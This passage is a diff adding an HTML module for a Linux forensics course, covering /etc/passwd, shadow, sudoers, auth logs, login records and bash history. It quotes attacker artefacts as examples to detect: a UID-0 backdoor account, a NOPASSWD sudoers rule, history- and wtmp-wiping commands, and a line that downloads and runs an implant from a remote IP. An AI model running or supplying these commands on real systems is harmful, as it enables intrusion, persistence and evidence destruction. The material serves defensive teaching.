@@ -1,0 +1,1175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CSC 156 – Module 9.3: User Accounts, Authentication, and Bash History</title>
+<style>
+/* ── Design tokens ─────────────────────────────────────────────────────── */
+:root {
+  --clr-primary:   #1a3a5c;
+  --clr-accent:    #2e6da4;
+  --clr-accent-lt: #d6e8f7;
+  --clr-bg:        #f5f7fa;
+  --clr-surface:   #ffffff;
+  --clr-border:    #c8d4e0;
+  --clr-text:      #1a1a2e;
+  --clr-muted:     #4a5568;
+  --clr-success:   #276749;
+  --clr-success-bg:#d4edda;
+  --clr-error:     #7b2020;
+  --clr-error-bg:  #fde8e8;
+  --clr-warn:      #5c3d00;
+  --clr-warn-bg:   #fff3cd;
+  --nav-h:         3.25rem;
+  --radius:        6px;
+}
+
+/* ── Reset / base ───────────────────────────────────────────────────────── */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  background: var(--clr-bg);
+  color: var(--clr-text);
+  line-height: 1.65;
+  font-size: 1rem;
+}
+a { color: var(--clr-accent); }
+
+/* ── Skip link ──────────────────────────────────────────────────────────── */
+.skip-link {
+  position: absolute; top: -999px; left: 0; padding: .5rem 1rem;
+  background: var(--clr-primary); color: #fff; font-weight: 700;
+  border-radius: 0 0 var(--radius) 0; z-index: 200;
+}
+.skip-link:focus { top: 0; }
+
+/* ── Sticky nav ─────────────────────────────────────────────────────────── */
+.top-nav {
+  position: sticky; top: 0; z-index: 100;
+  background: var(--clr-primary);
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 0 1rem; height: var(--nav-h);
+  box-shadow: 0 2px 6px rgba(0,0,0,.25);
+}
+.top-nav__title {
+  color: #fff; font-weight: 700; font-size: .95rem; white-space: nowrap;
+  overflow: hidden; text-overflow: ellipsis;
+}
+.top-nav__links {
+  display: flex; gap: .25rem; list-style: none; flex-wrap: wrap;
+}
+.top-nav__links a {
+  color: #cde;
+  text-decoration: none;
+  font-size: .82rem;
+  font-weight: 700;
+  min-width: 1.8rem;
+  text-align: center;
+  padding: .25rem .45rem;
+  border-radius: var(--radius);
+  transition: background .15s, color .15s;
+}
+.top-nav__links a:hover,
+.top-nav__links a:focus {
+  background: rgba(255,255,255,.18);
+  color: #fff;
+  outline: 2px solid #fff;
+  outline-offset: 1px;
+}
+
+/* ── Module progress strip ──────────────────────────────────────────────── */
+.module-strip {
+  background: var(--clr-accent-lt);
+  border-bottom: 1px solid var(--clr-border);
+  padding: .55rem 1.25rem;
+  display: flex; align-items: center; gap: .75rem; flex-wrap: wrap;
+}
+.module-strip__label { font-size: .8rem; color: var(--clr-muted); font-weight: 600; }
+.module-dots { display: flex; gap: .5rem; list-style: none; }
+.module-dot {
+  width: 2rem; height: 2rem;
+  border-radius: 50%;
+  background: #c5d4e4;
+  display: flex; align-items: center; justify-content: center;
+  font-size: .75rem; font-weight: 700; color: var(--clr-muted);
+}
+.module-dot--done { background: var(--clr-accent); color: #fff; }
+.module-dot--current {
+  background: var(--clr-primary); color: #fff;
+  outline: 2px solid var(--clr-accent); outline-offset: 2px;
+}
+
+/* ── Page header ────────────────────────────────────────────────────────── */
+.page-header {
+  background: linear-gradient(135deg, var(--clr-primary) 0%, var(--clr-accent) 100%);
+  color: #fff; padding: 2rem 1.5rem 1.75rem;
+}
+.page-header h1 { font-size: clamp(1.3rem, 3vw, 1.8rem); line-height: 1.25; }
+.page-header .subtitle { margin-top: .4rem; font-size: .95rem; opacity: .88; }
+.meta-row {
+  margin-top: .85rem; display: flex; gap: 1.25rem; flex-wrap: wrap;
+  font-size: .82rem; opacity: .82;
+}
+
+/* ── Main layout ────────────────────────────────────────────────────────── */
+main { max-width: 900px; margin: 0 auto; padding: 1.5rem 1.25rem 3rem; }
+
+/* ── Sections ───────────────────────────────────────────────────────────── */
+.section {
+  background: var(--clr-surface);
+  border: 1px solid var(--clr-border);
+  border-radius: var(--radius);
+  padding: 1.5rem;
+  margin-bottom: 1.75rem;
+  scroll-margin-top: var(--nav-h);
+}
+.section h2 {
+  font-size: 1.2rem; color: var(--clr-primary);
+  border-bottom: 2px solid var(--clr-accent-lt);
+  padding-bottom: .4rem; margin-bottom: 1rem;
+}
+.section h3 { font-size: 1rem; color: var(--clr-primary); margin: 1rem 0 .4rem; }
+.section p, .section li { margin-bottom: .5rem; }
+.section ul, .section ol { padding-left: 1.4rem; }
+
+/* ── Code blocks ────────────────────────────────────────────────────────── */
+pre {
+  background: #1e2a38; color: #c9d6e3;
+  padding: 1rem 1.1rem; border-radius: var(--radius);
+  overflow-x: auto; font-size: .85rem; line-height: 1.5;
+  margin: .75rem 0; white-space: pre;
+}
+code { font-family: "Consolas", "Courier New", monospace; }
+p code, li code {
+  background: #e8f0f8; color: #1a3a5c;
+  padding: .1rem .35rem; border-radius: 3px; font-size: .875em;
+}
+
+/* ── Callout boxes ──────────────────────────────────────────────────────── */
+.callout {
+  border-left: 4px solid var(--clr-accent);
+  background: var(--clr-accent-lt);
+  padding: .75rem 1rem; border-radius: 0 var(--radius) var(--radius) 0;
+  margin: .85rem 0;
+}
+.callout--warn {
+  border-color: #c07800;
+  background: var(--clr-warn-bg);
+  color: var(--clr-warn);
+}
+.callout--alert {
+  border-color: #a02020;
+  background: var(--clr-error-bg);
+  color: var(--clr-error);
+}
+
+/* ── Accordion ──────────────────────────────────────────────────────────── */
+.accordion { margin: .6rem 0; }
+.accordion__trigger {
+  width: 100%; text-align: left;
+  background: var(--clr-accent-lt); color: var(--clr-primary);
+  border: 1px solid var(--clr-border); border-radius: var(--radius);
+  padding: .65rem .9rem; font-size: .95rem; font-weight: 600;
+  cursor: pointer; display: flex; justify-content: space-between; align-items: center;
+  transition: background .15s;
+}
+.accordion__trigger:hover,
+.accordion__trigger:focus { background: #bcd5ef; outline: 2px solid var(--clr-accent); outline-offset: 1px; }
+.accordion__trigger::after { content: "▸"; font-size: .8rem; flex-shrink: 0; }
+.accordion__trigger[aria-expanded="true"] { border-radius: var(--radius) var(--radius) 0 0; }
+.accordion__trigger[aria-expanded="true"]::after { content: "▾"; }
+.accordion__panel {
+  display: none; border: 1px solid var(--clr-border); border-top: none;
+  border-radius: 0 0 var(--radius) var(--radius);
+  padding: 1rem; background: var(--clr-surface);
+}
+.accordion__panel.is-open { display: block; }
+
+/* ── Field table ────────────────────────────────────────────────────────── */
+.field-table {
+  width: 100%; border-collapse: collapse; font-size: .88rem; margin: .75rem 0;
+}
+.field-table th {
+  background: var(--clr-primary); color: #fff;
+  padding: .45rem .7rem; text-align: left;
+}
+.field-table td {
+  padding: .4rem .7rem; vertical-align: top;
+  border-bottom: 1px solid var(--clr-border);
+}
+.field-table tr:last-child td { border-bottom: none; }
+.field-table tr:nth-child(even) td { background: #f0f5fa; }
+.field-table .field-num {
+  font-weight: 700; color: var(--clr-accent); white-space: nowrap;
+}
+.field-table .field-example { font-family: monospace; color: #1a3a5c; }
+
+/* ── Mini-case ──────────────────────────────────────────────────────────── */
+.mini-case {
+  border: 2px solid var(--clr-accent);
+  border-radius: var(--radius); margin-top: .5rem; overflow: hidden;
+}
+.mini-case__header {
+  background: var(--clr-primary); color: #fff;
+  padding: .7rem 1rem; display: flex; align-items: center; gap: .6rem;
+}
+.mini-case__icon { font-size: 1.3rem; }
+.mini-case__header strong { font-size: 1rem; }
+.mini-case__body { padding: 1rem; }
+.mini-case__step {
+  background: var(--clr-accent-lt); border-radius: var(--radius);
+  padding: .65rem .9rem; margin-bottom: .75rem;
+  border-left: 3px solid var(--clr-accent);
+}
+.mini-case__step strong { color: var(--clr-primary); }
+.mini-case__question { margin: .85rem 0 .4rem; font-weight: 600; color: var(--clr-primary); }
+
+/* ── Reveal activity ────────────────────────────────────────────────────── */
+.reveal-btn {
+  background: var(--clr-accent); color: #fff;
+  border: none; border-radius: var(--radius);
+  padding: .4rem .85rem; font-size: .88rem; font-weight: 600;
+  cursor: pointer; margin-top: .35rem;
+  transition: background .15s;
+}
+.reveal-btn:hover, .reveal-btn:focus {
+  background: var(--clr-primary); outline: 2px solid var(--clr-accent); outline-offset: 2px;
+}
+.reveal-answer {
+  display: none; margin-top: .6rem;
+  background: var(--clr-success-bg); color: var(--clr-success);
+  border: 1px solid #84c997; border-radius: var(--radius);
+  padding: .65rem .9rem; font-size: .9rem;
+}
+.reveal-answer.is-open { display: block; }
+
+/* ── Knowledge check ────────────────────────────────────────────────────── */
+.quiz-question { margin-bottom: 1.4rem; }
+.quiz-question p { font-weight: 600; margin-bottom: .5rem; }
+.quiz-options { list-style: none; padding: 0; }
+.quiz-options li { margin-bottom: .35rem; }
+.quiz-options label {
+  display: flex; align-items: flex-start; gap: .5rem;
+  cursor: pointer; padding: .3rem .4rem; border-radius: 4px;
+}
+.quiz-options label:hover { background: var(--clr-accent-lt); }
+.quiz-options input[type="radio"] { margin-top: .15rem; flex-shrink: 0; }
+.check-btn {
+  background: var(--clr-accent); color: #fff;
+  border: none; border-radius: var(--radius);
+  padding: .45rem 1.1rem; font-size: .9rem; font-weight: 600;
+  cursor: pointer; margin-top: .35rem;
+  transition: background .15s;
+}
+.check-btn:hover, .check-btn:focus {
+  background: var(--clr-primary); outline: 2px solid var(--clr-accent); outline-offset: 2px;
+}
+.quiz-feedback {
+  display: none; margin-top: .6rem; padding: .65rem .9rem;
+  border-radius: var(--radius); font-size: .9rem; border: 1px solid transparent;
+}
+.quiz-feedback.correct {
+  display: block; background: var(--clr-success-bg);
+  color: var(--clr-success); border-color: #84c997;
+}
+.quiz-feedback.incorrect {
+  display: block; background: var(--clr-error-bg);
+  color: var(--clr-error); border-color: #e8a0a0;
+}
+
+/* ── Objectives list ────────────────────────────────────────────────────── */
+.obj-list { list-style: none; padding: 0; }
+.obj-list li {
+  padding: .4rem .5rem .4rem 1.75rem;
+  position: relative; border-bottom: 1px solid var(--clr-border);
+}
+.obj-list li:last-child { border-bottom: none; }
+.obj-list li::before {
+  content: "✓"; position: absolute; left: .4rem;
+  color: var(--clr-accent); font-weight: 700;
+}
+</style>
+</head>
+<body>
+
+<a class="skip-link" href="#main-content">Skip to main content</a>
+
+<!-- Sticky navigation -->
+<nav class="top-nav" aria-label="Module sections">
+  <span class="top-nav__title">9.3 User Accounts, Authentication &amp; Bash History</span>
+  <ul class="top-nav__links">
+    <li><a href="#scenario"      title="Investigation Scenario">1</a></li>
+    <li><a href="#user-accounts" title="User Accounts and Privilege Files">2</a></li>
+    <li><a href="#auth-logs"     title="Authentication Log Analysis">3</a></li>
+    <li><a href="#login-history" title="Binary Login History Files">4</a></li>
+    <li><a href="#bash-history"  title="Bash History Artifacts">5</a></li>
+    <li><a href="#mini-case"     title="Mini-Case Investigation">6</a></li>
+    <li><a href="#knowledge-check" title="Knowledge Check">7</a></li>
+  </ul>
+</nav>
+
+<!-- Module progress strip -->
+<div class="module-strip" aria-label="Week 9 module progress">
+  <span class="module-strip__label">Week 9:</span>
+  <ul class="module-dots" aria-label="Modules">
+    <li class="module-dot module-dot--done"    aria-label="Module 9.1 complete">9.1</li>
+    <li class="module-dot module-dot--done"    aria-label="Module 9.2 complete">9.2</li>
+    <li class="module-dot module-dot--current" aria-label="Module 9.3 current">9.3</li>
+  </ul>
+</div>
+
+<!-- Page header -->
+<header class="page-header">
+  <h1>Module 9.3: User Accounts, Authentication, and Bash History</h1>
+  <p class="subtitle">CSC 156 – Linux Forensics and Incident Response</p>
+  <div class="meta-row">
+    <span>⏱ Estimated time: 2.0–2.5 hours</span>
+    <span>📖 Week 9 – Day 2</span>
+    <span>🎯 Objectives 3 &amp; 4</span>
+  </div>
+</header>
+
+<main id="main-content">
+
+  <!-- ── Section 1: Scenario ── -->
+  <section class="section" id="scenario" aria-labelledby="h-scenario">
+    <h2 id="h-scenario">1. Investigation Scenario</h2>
+    <p>
+      You are examining a compromised Linux web server — <strong>web-prod-03</strong> — after a
+      system administrator noticed an unexpected outbound connection at 02:14 on a Wednesday morning.
+      The server runs Ubuntu 22.04 and is accessible only via SSH key-based authentication.
+      No password logins were supposed to be permitted.
+    </p>
+    <p>
+      In this module you will learn to extract and analyze the user-account files, authentication
+      logs, binary login-record files, and bash history to reconstruct what happened, who was
+      involved, and what anti-forensic steps the attacker may have taken.
+    </p>
+    <h3>Learning Objectives (this module)</h3>
+    <ul class="obj-list">
+      <li>Extract user account and privilege data from <code>/etc/passwd</code>, <code>/etc/shadow</code>, and <code>/etc/sudoers</code>.</li>
+      <li>Parse <code>auth.log</code> / <code>secure</code> to identify authentication events and brute-force patterns.</li>
+      <li>Use <code>last</code>, <code>lastb</code>, and <code>lastlog</code> to read binary login-history files.</li>
+      <li>Recover and interpret bash history, including detecting common anti-forensic manipulations.</li>
+    </ul>
+  </section>
+
+  <!-- ── Section 2: User Accounts ── -->
+  <section class="section" id="user-accounts" aria-labelledby="h-user-accounts">
+    <h2 id="h-user-accounts">2. User Accounts and Privilege Files</h2>
+    <p>
+      Linux stores user identity and credential information across several plain-text files
+      in <code>/etc/</code>. During a forensic investigation these files reveal which accounts
+      exist, which have elevated privileges, and whether any suspicious accounts were created.
+    </p>
+
+    <!-- /etc/passwd -->
+    <div class="accordion">
+      <button class="accordion__trigger" aria-expanded="false"
+              aria-controls="passwd-panel" id="passwd-btn">
+        /etc/passwd — User Identity Fields
+      </button>
+      <div class="accordion__panel" id="passwd-panel" role="region" aria-labelledby="passwd-btn">
+        <p>
+          Each line describes one user account in seven colon-separated fields.
+          The file is world-readable, which is necessary for programs to map UIDs to names.
+        </p>
+        <pre><code>root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+sysmon:x:1001:1001:System Monitor:/home/sysmon:/bin/bash
+backdoor:x:0:0::/home/backdoor:/bin/bash</code></pre>
+        <table class="field-table">
+          <thead>
+            <tr>
+              <th>Field #</th><th>Name</th><th>Example</th><th>Forensic significance</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td class="field-num">1</td>
+              <td>Username</td>
+              <td class="field-example">backdoor</td>
+              <td>Look for unfamiliar names, especially created around incident time.</td>
+            </tr>
+            <tr>
+              <td class="field-num">2</td>
+              <td>Password placeholder</td>
+              <td class="field-example">x</td>
+              <td><code>x</code> means the hash lives in <code>/etc/shadow</code>. An empty field means <em>no password</em> — a major red flag.</td>
+            </tr>
+            <tr>
+              <td class="field-num">3</td>
+              <td>UID</td>
+              <td class="field-example">0</td>
+              <td>UID 0 = root privileges regardless of username. Any non-root account with UID 0 is a backdoor.</td>
+            </tr>
+            <tr>
+              <td class="field-num">4</td>
+              <td>GID</td>
+              <td class="field-example">0</td>
+              <td>GID 0 (root group) also grants elevated access.</td>
+            </tr>
+            <tr>
+              <td class="field-num">5</td>
+              <td>GECOS / comment</td>
+              <td class="field-example">(empty)</td>
+              <td>Often blank on attacker-created accounts; legitimate service accounts typically have a description.</td>
+            </tr>
+            <tr>
+              <td class="field-num">6</td>
+              <td>Home directory</td>
+              <td class="field-example">/home/backdoor</td>
+              <td>Check whether the directory exists and what files it contains.</td>
+            </tr>
+            <tr>
+              <td class="field-num">7</td>
+              <td>Login shell</td>
+              <td class="field-example">/bin/bash</td>
+              <td>Service accounts should use <code>/usr/sbin/nologin</code> or <code>/bin/false</code>. An interactive shell on a service account is suspicious.</td>
+            </tr>
+          </tbody>
+        </table>
+        <div class="callout callout--alert">
+          <strong>Key indicator:</strong> The entry <code>backdoor:x:0:0::/home/backdoor:/bin/bash</code>
+          has UID 0 and GID 0 — it has full root privileges under a disguised name.
+          This is one of the most common Linux persistence mechanisms.
+        </div>
+      </div>
+    </div>
+
+    <!-- /etc/shadow -->
+    <div class="accordion">
+      <button class="accordion__trigger" aria-expanded="false"
+              aria-controls="shadow-panel" id="shadow-btn">
+        /etc/shadow — Password Hash Format
+      </button>
+      <div class="accordion__panel" id="shadow-panel" role="region" aria-labelledby="shadow-btn">
+        <p>
+          <code>/etc/shadow</code> is readable only by root. It stores hashed passwords and
+          password-aging metadata in nine colon-separated fields.
+        </p>
+        <pre><code>backdoor:$6$rounds=5000$xyz123$AbCdEf...:19800:0:99999:7:::</code></pre>
+        <p>The password hash uses the format: <code>$id$[options$]salt$hash</code></p>
+        <table class="field-table">
+          <thead><tr><th>Algorithm ID</th><th>Algorithm</th><th>Notes</th></tr></thead>
+          <tbody>
+            <tr><td class="field-num">$1$</td><td>MD5</td><td>Obsolete — weak; should never appear on a modern system.</td></tr>
+            <tr><td class="field-num">$2y$</td><td>bcrypt</td><td>Common on Debian/Ubuntu; adaptive cost factor.</td></tr>
+            <tr><td class="field-num">$5$</td><td>SHA-256</td><td>Reasonable but SHA-512 preferred.</td></tr>
+            <tr><td class="field-num">$6$</td><td>SHA-512</td><td>Current default on most modern distros.</td></tr>
+            <tr><td class="field-num">!</td><td>Locked account</td><td>Password field begins with <code>!</code> — account cannot be used for password login.</td></tr>
+            <tr><td class="field-num">* or !!</td><td>No password / never set</td><td>System accounts; <code>!!</code> means account was created but password was never set.</td></tr>
+          </tbody>
+        </table>
+        <p>
+          Field 3 is the last-changed date expressed as <strong>days since the Unix epoch</strong>
+          (1970-01-01). A recently changed date on an account you did not create is significant.
+        </p>
+        <div class="callout callout--warn">
+          <strong>Do not crack passwords on systems you do not own</strong> — even for forensic
+          practice. In a controlled lab environment, password cracking is a standard step, but
+          always ensure you have written authorization before attempting it.
+        </div>
+      </div>
+    </div>
+
+    <!-- /etc/group and /etc/sudoers -->
+    <div class="accordion">
+      <button class="accordion__trigger" aria-expanded="false"
+              aria-controls="priv-panel" id="priv-btn">
+        /etc/group and /etc/sudoers — Privilege Escalation Paths
+      </button>
+      <div class="accordion__panel" id="priv-panel" role="region" aria-labelledby="priv-btn">
+        <h3>High-risk groups</h3>
+        <p>
+          Membership in certain groups is functionally equivalent to having root access:
+        </p>
+        <ul>
+          <li><strong>sudo</strong> or <strong>wheel</strong> — can run any command as root.</li>
+          <li><strong>docker</strong> — can mount the host filesystem; equivalent to root.</li>
+          <li><strong>disk</strong> — direct block-device access; can read/write any file.</li>
+          <li><strong>lxd</strong> / <strong>lxc</strong> — container control; escalation possible.</li>
+        </ul>
+        <pre><code># Check which accounts are in the sudo group
+grep -E "^sudo:" /etc/group
+
+# Example output
+sudo:x:27:ubuntu,sysmon,backdoor</code></pre>
+
+        <h3>/etc/sudoers and NOPASSWD entries</h3>
+        <p>
+          <code>/etc/sudoers</code> controls which users and groups can run commands as root
+          and whether they need to authenticate. An attacker will often add a
+          <code>NOPASSWD</code> entry to maintain access without needing a password:
+        </p>
+        <pre><code># Legitimate entry
+%sudo   ALL=(ALL:ALL) ALL
+
+# Attacker-added entry — allows backdoor to run anything without a password
+backdoor ALL=(ALL) NOPASSWD:ALL
+
+# Entries in /etc/sudoers.d/ are also included — check that directory too
+ls -la /etc/sudoers.d/</code></pre>
+        <div class="callout callout--alert">
+          Always check <code>/etc/sudoers.d/</code> as well as <code>/etc/sudoers</code>.
+          Attackers prefer the subdirectory because it receives less scrutiny.
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── Section 3: Auth Logs ── -->
+  <section class="section" id="auth-logs" aria-labelledby="h-auth-logs">
+    <h2 id="h-auth-logs">3. Authentication Log Analysis</h2>
+    <p>
+      Authentication events are recorded in plain-text log files. On Debian/Ubuntu the file is
+      <code>/var/log/auth.log</code>; on RHEL/CentOS it is <code>/var/log/secure</code>.
+      Both follow a similar syslog format: <code>timestamp  hostname  service[PID]: message</code>.
+    </p>
+
+    <div class="accordion">
+      <button class="accordion__trigger" aria-expanded="false"
+              aria-controls="auth-success-panel" id="auth-success-btn">
+        Successful SSH Authentication
+      </button>
+      <div class="accordion__panel" id="auth-success-panel" role="region" aria-labelledby="auth-success-btn">
+        <pre><code>Mar  5 02:14:07 web-prod-03 sshd[8821]: Accepted publickey for backdoor from 198.51.100.47 port 54321 ssh2: RSA SHA256:XYZ...</code></pre>
+        <p>Key fields to note:</p>
+        <ul>
+          <li><strong>Username:</strong> <code>backdoor</code> — matches the suspicious /etc/passwd entry.</li>
+          <li><strong>Source IP:</strong> <code>198.51.100.47</code> — external address; correlate with threat intelligence.</li>
+          <li><strong>Time:</strong> 02:14 — unusual hour for legitimate maintenance.</li>
+          <li><strong>Auth method:</strong> <code>publickey</code> — attacker had already installed an SSH key.</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="accordion">
+      <button class="accordion__trigger" aria-expanded="false"
+              aria-controls="auth-fail-panel" id="auth-fail-btn">
+        Failed Logins and Brute-Force Patterns
+      </button>
+      <div class="accordion__panel" id="auth-fail-panel" role="region" aria-labelledby="auth-fail-btn">
+        <pre><code>Mar  4 23:58:12 web-prod-03 sshd[7701]: Failed password for root from 203.0.113.22 port 41002 ssh2
+Mar  4 23:58:14 web-prod-03 sshd[7701]: Failed password for root from 203.0.113.22 port 41002 ssh2
+Mar  4 23:58:15 web-prod-03 sshd[7701]: Failed password for root from 203.0.113.22 port 41002 ssh2
+Mar  4 23:58:31 web-prod-03 sshd[7701]: message repeated 64 more times: [ Failed password for root...]</code></pre>
+        <p>
+          Multiple failures in rapid succession from the same IP are the signature of a brute-force
+          or credential-stuffing attack. Compare timestamps: the gap between lines indicates
+          automation (sub-second) vs. a human attacker (multi-second).
+        </p>
+        <pre><code># Count failed attempts by source IP
+grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -20</code></pre>
+      </div>
+    </div>
+
+    <div class="accordion">
+      <button class="accordion__trigger" aria-expanded="false"
+              aria-controls="auth-sudo-panel" id="auth-sudo-btn">
+        sudo Escalation Events
+      </button>
+      <div class="accordion__panel" id="auth-sudo-panel" role="region" aria-labelledby="auth-sudo-btn">
+        <pre><code>Mar  5 02:15:03 web-prod-03 sudo: backdoor : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash</code></pre>
+        <p>This entry tells us:</p>
+        <ul>
+          <li>User <code>backdoor</code> ran <code>sudo /bin/bash</code> — obtained an interactive root shell.</li>
+          <li>Working directory was <code>/root</code> — the attacker was already in the root home directory.</li>
+          <li>No <code>COMMAND not found</code> or authentication failure — the NOPASSWD entry was in effect.</li>
+        </ul>
+        <div class="callout">
+          <strong>Tip:</strong> Rotate through archived logs too — <code>auth.log.1</code>,
+          <code>auth.log.2.gz</code>, etc. Attackers who know logging is enabled may wait for
+          log rotation to partially obscure their early reconnaissance.
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── Section 4: Binary Login History ── -->
+  <section class="section" id="login-history" aria-labelledby="h-login-history">
+    <h2 id="h-login-history">4. Binary Login History Files</h2>
+    <p>
+      Linux maintains three binary files that record login sessions, failed attempts, and
+      per-account last-login times. Because they are binary, you cannot read them with
+      <code>cat</code> — you must use the corresponding command-line tools.
+    </p>
+
+    <table class="field-table">
+      <thead>
+        <tr><th>File</th><th>Tool</th><th>Records</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code>/var/log/wtmp</code></td>
+          <td><code>last</code></td>
+          <td>Successful logins, logouts, reboots, and run-level changes.</td>
+        </tr>
+        <tr>
+          <td><code>/var/log/btmp</code></td>
+          <td><code>lastb</code></td>
+          <td>Failed login attempts (requires root to read).</td>
+        </tr>
+        <tr>
+          <td><code>/var/log/lastlog</code></td>
+          <td><code>lastlog</code></td>
+          <td>Most recent login for every account on the system.</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <h3>Using the tools</h3>
+    <pre><code># List all sessions recorded in wtmp (most recent first)
+last -F
+
+# Read a wtmp from a forensic image (does not need to be the live file)
+last -f /mnt/evidence/var/log/wtmp
+
+# List failed logins from btmp
+sudo lastb -F
+
+# Show last login for all accounts
+lastlog
+
+# Show only accounts that HAVE logged in recently
+lastlog | grep -v "Never logged in"</code></pre>
+
+    <div class="accordion">
+      <button class="accordion__trigger" aria-expanded="false"
+              aria-controls="tampering-panel" id="tampering-btn">
+        Signs of wtmp / btmp Tampering
+      </button>
+      <div class="accordion__panel" id="tampering-panel" role="region" aria-labelledby="tampering-btn">
+        <p>
+          Sophisticated attackers often clear or modify these binary files to remove login evidence.
+          Look for:
+        </p>
+        <ul>
+          <li>
+            <strong>File smaller than expected</strong> — entries are fixed-size records.
+            A wtmp that is unusually small compared to the system's age is suspicious.
+            Compare file size against archived backups or the system's install date.
+          </li>
+          <li>
+            <strong>Truncated to zero bytes</strong> — <code>cat /dev/null &gt; /var/log/wtmp</code>
+            is a classic anti-forensic technique. A zero-byte wtmp when the system has been running
+            for months is an immediate red flag.
+          </li>
+          <li>
+            <strong>Gap in reboot records</strong> — wtmp records every reboot.
+            If the system has been up for 90 days but wtmp only shows 10 days of history, entries
+            were probably deleted.
+          </li>
+          <li>
+            <strong>Mismatch with auth.log</strong> — if auth.log shows a successful SSH session
+            but there is no corresponding entry in wtmp, wtmp was likely edited.
+          </li>
+        </ul>
+        <div class="callout callout--warn">
+          Tampering with these files is itself evidence of an attacker with root access and
+          awareness of forensic investigation techniques. Document the tampered state — do not
+          attempt to reconstruct the original data unless you have a verified backup.
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── Section 5: Bash History ── -->
+  <section class="section" id="bash-history" aria-labelledby="h-bash-history">
+    <h2 id="h-bash-history">5. Bash History Artifacts</h2>
+    <p>
+      Bash (and other shells) write a record of commands to a history file when a session ends.
+      This file is a plain-text goldmine for reconstructing attacker activity — and consequently
+      a frequent target for anti-forensic techniques.
+    </p>
+
+    <h3>Default locations</h3>
+    <ul>
+      <li><code>~/.bash_history</code> — commands for the user's default shell.</li>
+      <li><code>~/.zsh_history</code>, <code>~/.sh_history</code> — shell-specific equivalents.</li>
+      <li><code>/root/.bash_history</code> — root's command history; especially valuable.</li>
+    </ul>
+
+    <h3>Environment variables that control history behavior</h3>
+    <table class="field-table">
+      <thead>
+        <tr><th>Variable</th><th>Default</th><th>Forensic impact if changed</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code>HISTFILE</code></td>
+          <td><code>~/.bash_history</code></td>
+          <td>Set to <code>/dev/null</code> to prevent any history from being written.</td>
+        </tr>
+        <tr>
+          <td><code>HISTSIZE</code></td>
+          <td>500–1000</td>
+          <td>Set to 0 to disable in-memory history accumulation.</td>
+        </tr>
+        <tr>
+          <td><code>HISTFILESIZE</code></td>
+          <td>500–2000</td>
+          <td>Set to 0 to prevent anything from being saved to disk.</td>
+        </tr>
+        <tr>
+          <td><code>HISTTIMEFORMAT</code></td>
+          <td>(unset)</td>
+          <td>When set, bash prepends timestamps to each entry — very useful forensically.</td>
+        </tr>
+        <tr>
+          <td><code>HISTIGNORE</code></td>
+          <td>(unset)</td>
+          <td>Can be set to suppress specific command patterns from being recorded.</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="accordion">
+      <button class="accordion__trigger" aria-expanded="false"
+              aria-controls="antiforensic-panel" id="antiforensic-btn">
+        Anti-Forensic Techniques Targeting Bash History
+      </button>
+      <div class="accordion__panel" id="antiforensic-panel" role="region" aria-labelledby="antiforensic-btn">
+        <p>Attackers use several well-known techniques to suppress or destroy bash history:</p>
+        <ul>
+          <li>
+            <strong>Redirect HISTFILE to /dev/null</strong>
+            <pre><code>export HISTFILE=/dev/null</code></pre>
+            All subsequent commands in this session will not be saved.
+          </li>
+          <li>
+            <strong>Set HISTSIZE to zero</strong>
+            <pre><code>export HISTSIZE=0
+export HISTFILESIZE=0</code></pre>
+            Prevents history from accumulating in memory or being written.
+          </li>
+          <li>
+            <strong>Prepend a space</strong>
+            <pre><code"> rm -rf /tmp/malware</code></pre>
+            Commands beginning with a space are not saved when <code>HISTCONTROL=ignorespace</code>
+            is set (common default).
+          </li>
+          <li>
+            <strong>Manually clear or overwrite the file</strong>
+            <pre><code>cat /dev/null > ~/.bash_history
+history -c
+rm ~/.bash_history</code></pre>
+          </li>
+          <li>
+            <strong>Unsetting the history file</strong>
+            <pre><code>unset HISTFILE</code></pre>
+            When bash exits, it writes to HISTFILE. If HISTFILE is unset, no file is updated.
+          </li>
+        </ul>
+        <div class="callout callout--alert">
+          <strong>The anti-forensic act is itself evidence.</strong> Finding any of these commands
+          in a history file — or finding a truncated/missing file where one should exist — tells
+          you the attacker was sophisticated and actively trying to cover their tracks.
+        </div>
+      </div>
+    </div>
+
+    <div class="accordion">
+      <button class="accordion__trigger" aria-expanded="false"
+              aria-controls="histread-panel" id="histread-btn">
+        Reading and Interpreting History Files
+      </button>
+      <div class="accordion__panel" id="histread-panel" role="region" aria-labelledby="histread-btn">
+        <pre><code># Read a history file from a forensic image (as root)
+cat /mnt/evidence/root/.bash_history
+
+# If HISTTIMEFORMAT was set, entries look like:
+#1741132440
+export HISTFILE=/dev/null
+#1741132447
+wget http://203.0.113.22/implant.sh -O /tmp/.x
+#1741132449
+chmod +x /tmp/.x && /tmp/.x
+#1741132512
+cat /dev/null > ~/.bash_history</code></pre>
+        <p>
+          The <code>#</code>-prefixed lines are Unix timestamps. Convert them with
+          <code>date -d @1741132440</code> or an online epoch converter.
+        </p>
+        <p>
+          Even when the attacker deleted the history file, you may recover commands from:
+        </p>
+        <ul>
+          <li>Unallocated disk space (if the file was deleted but not securely wiped).</li>
+          <li>Swap space — commands may be paged out during execution.</li>
+          <li>Shell session logs if the terminal emulator or <code>script</code> utility was active.</li>
+          <li>Audit logs (<code>/var/log/audit/audit.log</code>) if the auditd daemon was running.</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── Section 6: Mini-Case ── -->
+  <section class="section" id="mini-case" aria-labelledby="h-mini-case">
+    <h2 id="h-mini-case">6. Mini-Case Investigation</h2>
+    <p>
